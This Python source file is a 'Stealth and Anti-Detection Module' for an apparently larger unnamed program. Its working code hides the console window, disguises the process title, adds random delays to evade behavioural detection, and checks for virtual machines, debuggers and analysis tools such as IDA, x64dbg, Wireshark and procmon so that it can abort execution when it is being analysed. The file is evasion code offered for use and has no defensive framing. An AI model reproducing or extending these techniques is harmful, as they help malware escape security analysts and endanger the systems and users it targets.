# Stealth and Anti-Detection Module
# Implements various techniques to avoid detection and analysis

import sys
import os
import ctypes
import time
import random
import logging
from config import SILENT_MODE, DEBUG_MODE, PROCESS_NAME_MASQUERADE, HIDE_CONSOLE

class StealthManager:
    
    def __init__(self):
        self.setup_logging()
        self.is_windows = sys.platform == "win32"
        
    def setup_logging(self):
        if SILENT_MODE:
            logging.disable(logging.CRITICAL)
        elif DEBUG_MODE:
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
        else:
            logging.basicConfig(level=logging.ERROR)
    
    def initialize_stealth(self):
        try:
            if self.is_windows:
                self.masquerade_process()
                if HIDE_CONSOLE:
                    self.hide_console_window()
            return True
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Stealth initialization failed: {e}")
            return False
    
    def masquerade_process(self, fake_name=None):
        if not self.is_windows:
            return False
            
        try:
            fake_name = fake_name or PROCESS_NAME_MASQUERADE
            ctypes.windll.kernel32.SetConsoleTitleW(fake_name)
            return True
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Process masquerading failed: {e}")
            return False
    
    def hide_console_window(self):
        if not self.is_windows:
            return False
            
        try:
            import win32gui
            import win32con
            
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
            console_hwnd = win32gui.FindWindow("ConsoleWindowClass", None)
            if console_hwnd:
                win32gui.ShowWindow(console_hwnd, win32con.SW_HIDE)
            
            return True
        except ImportError:
            # Fallback method using ctypes
            try:
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
                return True
            except Exception:
                return False
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Console hiding failed: {e}")
            return False
    
    def add_jitter(self, min_delay=None, max_delay=None):
        """Add random delay to avoid behavioral detection"""
        from config import JITTER_MIN, JITTER_MAX
        
        min_delay = min_delay or JITTER_MIN
        max_delay = max_delay or JITTER_MAX
        
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)
        return delay
    
    def detect_analysis_environment(self):
        indicators = []
        
        try:
            vm_indicators = self._check_vm_artifacts()
            if vm_indicators:
                indicators.extend(vm_indicators)
            
            debug_indicators = self._check_debug_environment()
            if debug_indicators:
                indicators.extend(debug_indicators)
            
            resource_indicators = self._check_system_resources()
            if resource_indicators:
                indicators.extend(resource_indicators)
                
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Analysis environment detection failed: {e}")
        
        return indicators
    
    def _check_vm_artifacts(self):
        """Check for virtual machine artifacts"""
        indicators = []
        
        try:
            import psutil
            import subprocess
            
            vm_processes = [
                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                'qemu-ga.exe', 'prl_cc.exe', 'prl_tools.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
                    indicators.append(f"VM process detected: {proc.info['name']}")
            
            if self.is_windows:
                vm_registry_keys = [
                    r'HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools',
                    r'HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions',
                    r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxGuest'
                ]
                
                for key in vm_registry_keys:
                    try:
                        result = subprocess.run([
                            'reg', 'query', key
                        ], capture_output=True, text=True)
                        
                        if result.returncode == 0:
                            indicators.append(f"VM registry key found: {key}")
                    except:
                        continue
                        
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"VM artifact check failed: {e}")
        
        return indicators
    
    def _check_debug_environment(self):
        indicators = []
        
        try:
            import psutil
            
            # Common analysis tools
            analysis_tools = [
                'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe',
                'ida64.exe', 'idaq.exe', 'idaq64.exe', 'idaw.exe',
                'scylla.exe', 'protection_id.exe', 'lordpe.exe',
                'importrec.exe', 'wireshark.exe', 'fiddler.exe',
                'procmon.exe', 'procexp.exe', 'regmon.exe',
                'filemon.exe', 'apimonitor.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in analysis_tools:
                    indicators.append(f"Analysis tool detected: {proc.info['name']}")
                    
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Debug environment check failed: {e}")
        
        return indicators
    
    def _check_system_resources(self):
        """Check system resources for VM indicators"""
        indicators = []
        
        try:
            import psutil
            
            ram_gb = psutil.virtual_memory().total / (1024**3)
            if ram_gb < 2:
                indicators.append(f"Low RAM detected: {ram_gb:.1f}GB")
            
            cpu_count = psutil.cpu_count()
            if cpu_count <= 2:
                indicators.append(f"Low CPU count: {cpu_count}")
            
            # Check disk size (VMs often have small disks)
            disk_usage = psutil.disk_usage('/')
            disk_gb = disk_usage.total / (1024**3)
            if disk_gb < 50:
                indicators.append(f"Small disk detected: {disk_gb:.1f}GB")
                
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"System resource check failed: {e}")
        
        return indicators
    
    def safe_execute(self, func, *args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            if DEBUG_MODE:
                logging.error(f"Error in {func.__name__}: {e}")
            return None
    
    def should_abort_execution(self):
        analysis_indicators = self.detect_analysis_environment()
        
        # Abort if too many indicators are present
        if len(analysis_indicators) >= 3:
            if DEBUG_MODE:
                logging.warning(f"Analysis environment detected: {analysis_indicators}")
            return True
        
        return False

# Global stealth manager instance
stealth_manager = StealthManager()